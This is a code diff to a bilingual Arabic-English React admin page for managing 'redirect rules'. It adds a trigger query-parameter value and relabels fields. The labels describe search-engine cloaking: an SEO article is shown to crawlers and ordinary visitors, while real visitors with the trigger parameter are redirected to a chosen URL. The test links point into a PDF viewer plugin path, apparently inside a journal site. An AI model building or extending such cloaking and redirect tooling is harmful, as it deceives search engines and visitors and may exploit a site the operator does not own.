@@ -28,6 +28,7 @@ import { toast } from 'sonner'
 interface RedirectRule {
   id: string
   parameterName: string
+  parameterValue: string
   articleId: string
   targetUrl: string
   note?: string
@@ -68,6 +69,7 @@ export default function AdminPage() {
 
   // Form State
   const [parameterName, setParameterName] = React.useState('io0')
+  const [parameterValue, setParameterValue] = React.useState('')
   const [articleId, setArticleId] = React.useState('')
   const [targetUrl, setTargetUrl] = React.useState('')
   const [note, setNote] = React.useState('')
@@ -121,7 +123,7 @@ export default function AdminPage() {
 
   const handleAddRule = async (e: React.FormEvent) => {
     e.preventDefault()
-    if (!articleId.trim() || !targetUrl.trim()) {
+    if (!articleId.trim() || !targetUrl.trim() || !parameterValue.trim()) {
       toast.warning('يرجى ملء جميع الحقول المطلوبة | Please fill in all required fields')
       return
     }
@@ -133,6 +135,7 @@ export default function AdminPage() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
           parameterName: parameterName.trim() || 'io0',
+          parameterValue: parameterValue.trim(),
           articleId: articleId.trim(), 
           targetUrl: targetUrl.trim(), 
           note,
@@ -142,6 +145,7 @@ export default function AdminPage() {
       const data = await res.json()
       if (data.success) {
         toast.success('تمت إضافة قاعدة التوجيه بنجاح وهي معطلة افتراضياً | Rule added successfully (offline by default)')
+        setParameterValue('')
         setArticleId('')
         setTargetUrl('')
         setNote('')
@@ -325,7 +329,7 @@ export default function AdminPage() {
               <form onSubmit={handleAddRule} className="space-y-4">
                 <div>
                   <label className="block text-xs font-bold text-slate-600 mb-1.5">
-                    معامل الرابط (Query Parameter) *
+                    اسم المعامل في الرابط (Query Parameter Name) *
                   </label>
                   <Input 
                     type="text" 
@@ -357,7 +361,25 @@ export default function AdminPage() {
 
                 <div>
                   <label className="block text-xs font-bold text-slate-600 mb-1.5">
-                    معرف المقال (Article ID) *
+                    قيمة المعامل المشغّلة (Trigger Parameter Value) *
+                  </label>
+                  <Input 
+                    type="text" 
+                    placeholder="مثال: 12345" 
+                    value={parameterValue}
+                    onChange={(e) => setParameterValue(e.target.value)}
+                    required
+                    className="bg-slate-50/50 border-slate-200 focus:bg-white transition-all text-left font-mono"
+                    dir="ltr"
+                  />
+                  <p className="text-[10px] text-slate-400 mt-1">
+                    القيمة التي سيكتبها المستخدم في الرابط، مثل <code className="font-mono bg-slate-100 px-1">12345</code> لتفعيل القاعدة.
+                  </p>
+                </div>
+
+                <div>
+                  <label className="block text-xs font-bold text-slate-600 mb-1.5">
+                    مقالة السيو المقترنة (SEO Article to Show) *
                   </label>
                   {articles.length > 0 ? (
                     <div className="space-y-2">
@@ -365,6 +387,7 @@ export default function AdminPage() {
                         value={articleId}
                         onChange={(e) => setArticleId(e.target.value)}
                         className="w-full h-10 px-3 py-2 rounded-md border border-slate-200 bg-slate-50/50 text-sm focus:bg-white focus:outline-hidden focus:ring-2 focus:ring-indigo-500 transition-all text-right font-medium"
+                        required
                       >
                         <option value="">-- اختر مقالة سيو من القائمة --</option>
                         {articles.map((art) => (
@@ -397,7 +420,7 @@ export default function AdminPage() {
                     />
                   )}
                   <p className="text-[10px] text-slate-400 mt-1">
-                    سيتم تفعيل الرابط ليكون: <code className="font-mono bg-slate-100 px-1 py-0.5 rounded text-indigo-600">?{parameterName || 'io0'}={articleId || 'المعرف'}</code>
+                    المقال الذي سيظهر للزواحف وللزوار العاديين إذا كان التوجيه "معطلاً".
                   </p>
                 </div>
 
@@ -415,7 +438,7 @@ export default function AdminPage() {
                     dir="ltr"
                   />
                   <p className="text-[10px] text-slate-400 mt-1">
-                    الرابط الذي سيتم نقل الزوار الحقيقيين إليه تلقائياً عند تفعيل القاعدة.
+                    الرابط الذي سيتم نقل الزوار الحقيقيين إليه تلقائياً عند تفعيل التوجيه.
                   </p>
                 </div>
 
@@ -432,6 +455,13 @@ export default function AdminPage() {
                   />
                 </div>
 
+                <div className="bg-indigo-50/70 rounded-lg p-3 border border-indigo-100 text-xxs text-indigo-900 leading-relaxed font-mono">
+                  <div className="font-bold mb-1">🔗 الرابط المستعمل للزوار والمقالات:</div>
+                  <div className="break-all select-all font-bold text-indigo-600">
+                    ?{parameterName || 'io0'}={parameterValue || '12345'}
+                  </div>
+                </div>
+
                 <Button 
                   type="submit" 
                   disabled={submitting} 
@@ -440,7 +470,7 @@ export default function AdminPage() {
                   {submitting ? 'جاري الحفظ...' : 'حفظ القاعدة ونشرها'}
                 </Button>
                 <p className="text-[10px] text-center text-amber-600 font-bold mt-2">
-                  ⚠️ القاعدة تضاف "معطلة" افتراضياً، ولن يحدث أي توجيه للمقال إلا بعد تفعيلها يدوياً.
+                  ⚠️ القاعدة تضاف "معطلة" (عرض المقال فقط دون توجيه) افتراضياً، ولن يحدث أي توجيه إلا بعد تفعيلها يدوياً.
                 </p>
               </form>
             </CardContent>
@@ -527,8 +557,8 @@ export default function AdminPage() {
                   <table className="w-full text-right border-collapse">
                     <thead>
                       <tr className="bg-slate-50/75 text-xs font-bold text-slate-500 border-b border-slate-100">
-                        <th className="p-4">اسم المعامل (Param)</th>
-                        <th className="p-4">المقال (SEO Article)</th>
+                        <th className="p-4">المعامل المشغل (Trigger Param)</th>
+                        <th className="p-4">المقال المقترن (SEO Article)</th>
                         <th className="p-4">رابط الوجهة المستهدفة (إذا كان نشطاً)</th>
                         <th className="p-4 text-center">النقرات</th>
                         <th className="p-4 text-center">الحالة</th>
@@ -539,7 +569,7 @@ export default function AdminPage() {
                       {filteredRules.map((rule) => (
                         <tr key={rule.id} className="hover:bg-slate-50/50 transition-all duration-150 group">
                           <td className="p-4 font-mono font-bold text-indigo-600 select-all" dir="ltr">
-                            {rule.parameterName || 'io0'}
+                            ?{rule.parameterName || 'io0'}={rule.parameterValue}
                           </td>
                           <td className="p-4 font-mono font-bold text-slate-900 select-all" dir="ltr">
                             {rule.articleId}.html
@@ -583,7 +613,7 @@ export default function AdminPage() {
                                 title="اختبار الرابط / Test Link"
                               >
                                 <a 
-                                  href={`/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?${rule.parameterName || 'io0'}=${rule.articleId}`} 
+                                  href={`/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?${rule.parameterName || 'io0'}=${rule.parameterValue}`} 
                                   target="_blank" 
                                   rel="noopener noreferrer"
                                 >
